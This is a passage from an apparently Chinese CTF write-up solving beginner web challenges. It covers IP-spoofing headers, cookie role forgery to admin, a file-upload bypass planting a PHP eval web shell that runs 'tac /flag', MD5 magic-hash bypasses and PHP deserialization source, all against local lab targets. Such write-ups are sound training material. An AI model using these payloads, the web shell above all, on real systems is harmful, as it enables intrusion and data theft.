Missions</code></pre><p>考察基础的http协议</p><p><img src="easy.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">NewStarCTF2023</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">newstarctf.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">power=ctfer</span></span><span class="token header"><span class="token header-name keyword">X-Real-Ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-Ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>secret=n3wst4rCTF2023g00000d伪造IP<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Rriginating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-addr</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">HTTP_CLIENT_IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Real-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">via</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1  代理</span></span></code></pre><h4 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h4><p>文末有一串密文</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</p><p>这是一串16进制编码，解码得到</p><p>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>flag的内容解码得到</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h4 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h4><p>F12源码中被撤回的消息那里有flag</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>附件中有一些api说明</p><p>注册 <code>POST /register</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>登录 <code>POST /login</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>获取flag <code>GET /flag</code></p><p>查询服务状态 &#96;GET &#x2F;status</p><p>按照流程注册并登陆后，返回了Cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">token=eyJ1c2VybmFtZSI6ICJoc2FkIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==;</span></span>base64decode：&#123;"username": "hsad", "password": "123456", "role": "user"&#125;</code></pre><p>将<code>role</code>改为admin并作为Cookie访问&#x2F;flag得到flag</p><h4 id="gas-gas-gas-Spider"><a href="#gas-gas-gas-Spider" class="headerlink" title="gas!gas!gas!(Spider)"></a>gas!gas!gas!(Spider)</h4><p>如何漂移</p><ol><li>油门大轮胎转速高空转，抓地力就小，反之抓地力大</li><li>保持反打，根据弯方向提示，反打反向</li><li>在0.5s内快速反应，并坚持下来五轮</li><li>重新随便提交一次操作来重新开始</li></ol><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;选手:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;方向控制:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;左&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;直行&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;右&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;油门控制:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;松开&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;保持&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;全开&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>根据返回的提示来改变每次赛车的操作，不过有时间限制，所以要编写脚本完成</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:3906/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">"driver=hsad&amp;steering_control=0&amp;throttle=0&#125;"</span>post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>post_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>steering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'弯道向左'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'弯道向右'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'弯道直行'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'保持这个速度'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'抓地力太大了'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'抓地力太小了'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    steering_control_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'-1'</span><span class="token punctuation">:</span> <span class="token string">'左'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'直行'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'右'</span>    <span class="token punctuation">&#125;</span>    throttle_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'松开'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'保持'</span><span class="token punctuation">,</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'全开'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>steering_control<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>throttle<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=hsad&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    </code></pre><h4 id="moe图床-文件上传"><a href="#moe图床-文件上传" class="headerlink" title="moe图床(文件上传)"></a>moe图床(文件上传)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> <span class="token constant">fileExtension</span> <span class="token operator">=</span> file<span class="token operator">.</span>name<span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token operator">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'只允许上传后缀名为png的文件！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span></code></pre><p>审计源码时发现，只是简单的用<code>.</code>作为分隔判断了第一个后缀名，于是上传</p><pre class="language-php" data-language="php"><code class="language-php">1.png.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>GET: http://localhost:6472/uploads/1.png.phpPOST: attack=system('tac /flag');</code></pre><h4 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h4><p>打开题目可见只需要bp跑一到一千的数字即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1000</span><span class="token operator">></span> to connect to different parallel universes</code></pre><h4 id="meo图床-文件包含-md5"><a href="#meo图床-文件包含-md5" class="headerlink" title="meo图床(文件包含 md5)"></a>meo图床(文件包含 md5)</h4><p>这次增加了文件头检测于是加上<code>GIF89a</code>于是上传成功，不过发现并不是直接给出文件目录，而是通过参数传递，于是猜测文件包含漏洞</p><p><img src="meo%E5%9B%BE%E5%BA%8A.png" loading="lazy"></p><p>得到提示访问<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>简单的md5绕过，可以数组绕过，也可以md5 0e绕过</p><pre class="language-php" data-language="php"><code class="language-php">Payload：param1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span>    <span class="token constant">QLTHNDT</span> <span class="token operator">-></span> <span class="token property">0e405967825401955372549139051580</span>    <span class="token constant">QNKCDZO</span> <span class="token operator">-></span> <span class="token property">0e830400451993494058024219903391</span>     s878926199a <span class="token operator">-></span> <span class="token property">0e545993274517709034328855841020</span>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">11</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">22</span></code></pre><h4 id="夺命十三枪-反序列化字符串逃逸"><a href="#夺命十三枪-反序列化字符串逃逸" class="headerlink" title="夺命十三枪(反序列化字符串逃逸)"></a>夺命十三枪(反序列化字符串逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'夺命十三枪'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:&#123;s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"Nobody";&#125;Far away from COOL...</code></pre><p>看到了<code>require_once(&#39;Hanxin.exe.php&#39;);</code></p><p>Hanxin.exe.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span> <span class="token comment">// 12 32</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>只要触发<code>__toString</code>并让<code>Spear_Owner === 